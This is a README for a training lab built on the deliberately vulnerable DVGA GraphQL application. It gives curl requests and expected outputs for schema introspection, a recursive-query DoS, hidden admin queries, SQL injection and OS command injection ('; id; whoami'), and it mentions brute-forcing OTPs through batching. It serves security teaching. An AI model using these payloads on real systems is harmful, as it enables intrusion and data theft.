# DVGA - Damn Vulnerable GraphQL Application

## Overview

Damn Vulnerable GraphQL Application (DVGA) is an intentionally vulnerable implementation of GraphQL designed to learn and practice GraphQL security and API penetration testing.

- **Upstream Repository**: [dolevf/Damn-Vulnerable-GraphQL-Application](https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application)
- **Reference Documentation**: [OWASP GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- **Default Port / Access**: `http://localhost:5013`
- **GraphQL Endpoint**: `http://localhost:5013/graphql`
- **Directory**: `Classes/02_web_penetration_tester/03_api_penetration_testing/graphql_dvga`
- **Container Name**: `cyberlab_02_dvga_graphql`

---

## Lab Architecture & Docker Configuration

DVGA is built on Flask, Graphene-Python, and Gevent. By default, DVGA binds to `127.0.0.1` unless configured with `WEB_HOST=0.0.0.0`. In `docker-compose.yml`, `WEB_HOST=0.0.0.0` is explicitly configured to allow container port forwarding.

```yaml
services:
  dvga:
    image: dolevf/dvga:latest
    pull_policy: missing
    container_name: cyberlab_02_dvga_graphql
    environment:
      - WEB_HOST=0.0.0.0
    ports:
      - "5013:5013"
    restart: unless-stopped
```

---

## Vulnerabilities & Attack Scenarios

### 1. Schema Introspection (`__schema`)

When introspection is enabled in production GraphQL deployments, attackers can map out the entire schema, query types, mutations, and fields.

**Request:**

```bash
curl -s -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

**Expected Output:**

```json
{
  "data": {
    "__schema": {
      "types": [
        { "name": "Query" },
        { "name": "PasteObject" },
        { "name": "ID" },
        { "name": "String" },
        { "name": "Boolean" },
        { "name": "Int" },
        { "name": "OwnerObject" },
        { "name": "UserObject" },
        { "name": "SearchResult" },
        { "name": "AuditObject" },
        { "name": "DateTime" },
        { "name": "Mutations" },
        { "name": "CreatePaste" },
        { "name": "EditPaste" },
        { "name": "DeletePaste" },
        { "name": "UploadPaste" },
        { "name": "ImportPaste" },
        { "name": "CreateUser" },
        { "name": "UserInput" },
        { "name": "Login" },
        { "name": "Subscription" },
        { "name": "__Schema" },
        { "name": "__Type" }
      ]
    }
  }
}
```

To extract all available fields under the root `Query` object:

```bash
curl -s -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"Query\") { fields { name args { name type { name } } } } }"}'
```

---

### 2. Circular Query / Deep Recursion Denial of Service (DoS)

Circular relationships between entities (e.g., `PasteObject.owner` -> `OwnerObject.pastes` -> `PasteObject.owner` ...) can be exploited by nesting queries without depth limits, causing server-side CPU exhaustion.

**Request:**

```bash
curl -s -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ pastes { owner { pastes { owner { pastes { id title } } } } } }"}'
```

**Expected Output:**
The server recursively traverses the relation graph without rejecting query depth (unless hardened mode is enabled):

```json
{
  "data": {
    "pastes": [
      {
        "owner": {
          "pastes": [
            {
              "owner": {
                "pastes": [
                  { "id": "1", "title": "Testing Testing" },
                  { "id": "2", "title": "555-555-1337" }
                ]
              }
            }
          ]
        }
      }
    ]
  }
}
```

---

### 3. Hidden Administrative Queries & Information Disclosure

Introspection reveals unpublished sensitive queries:

- `systemHealth`: Discloses system load averages.
- `systemUpdate`: Discloses maintenance state.
- `audits`: Discloses system audit logs.

**Request (`systemHealth`):**

```bash
curl -s -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ systemHealth }"}'
```

**Expected Output:**

```json
{ "data": { "systemHealth": "System Load: 0.12\n" } }
```

---

### 4. SQL Injection via Query Arguments

The `pastes` query accepts a `filter` argument which is interpolated directly into an SQL query string via `result.filter(text("title = '%s' or content = '%s'" % (filter, filter)))`.

**Request (Bypass filter to leak private pastes):**

```bash
curl -s -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ pastes(public: true, filter: \"'\'' OR 1=1 --\") { id title content public } }"}'
```

**Expected Output:**
Returns all database pastes (including private pastes where `public: false`):

```json
{
  "data": {
    "pastes": [
      {
        "id": "1",
        "title": "Testing Testing",
        "content": "My First Paste",
        "public": false
      },
      {
        "id": "2",
        "title": "555-555-1337",
        "content": "My Phone Number",
        "public": true
      }
    ]
  }
}
```

---

### 5. OS Command Injection via `systemDebug`

The administrative `systemDebug` field accepts an argument string executed via `helpers.run_cmd('ps {}'.format(arg))` using `os.popen()`.

**Request:**

```bash
curl -s -X POST http://localhost:5013/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ systemDebug(arg: \"; id; whoami\") }"}'
```

**Expected Output:**

```json
{
  "data": {
    "systemDebug": "    PID TTY          TIME CMD\n      1 ?        00:00:00 python\n     75 ?        00:00:00 sh\n     76 ?        00:00:00 ps\nuid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\ndvga\n"
  }
}
```

---

## How to Solve & Practice

1. Start the lab: `docker compose up -d` and open `http://localhost:5013`.
2. Perform schema introspection using InQL extension, GraphQL Voyager, or Burp Suite: query `__schema { types { name } }`.
3. Find hidden administrative queries or sensitive fields (e.g. `pastes`, `systemHealth`, `systemDebug`, internal user emails).
4. Test Batching Attacks to brute-force OTP or credentials in a single HTTP request.
5. Execute SQLi / Command Injection inside GraphQL arguments.
6. Toggle difficulty between `Beginner` and `Expert` using the UI or header `X-DVGA-MODE: Expert` to observe query depth and cost analyzers.

---

## YouTube Walkthroughs & Solving Guides

- [Graphql Endpoint Analysis | Damn Vulnerable Graphql Application](https://www.youtube.com/watch?v=In-XF5sY1Yo)
- [DVGA - Damn Vulnerable GraphQL Application Exploitation Part 2](https://www.youtube.com/watch?v=YA-mL9Z8SNI)
- [Farah Hawa - HACKING GraphQL FOR BEGINNERS](https://www.youtube.com/watch?v=OQCgmftU-Og)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
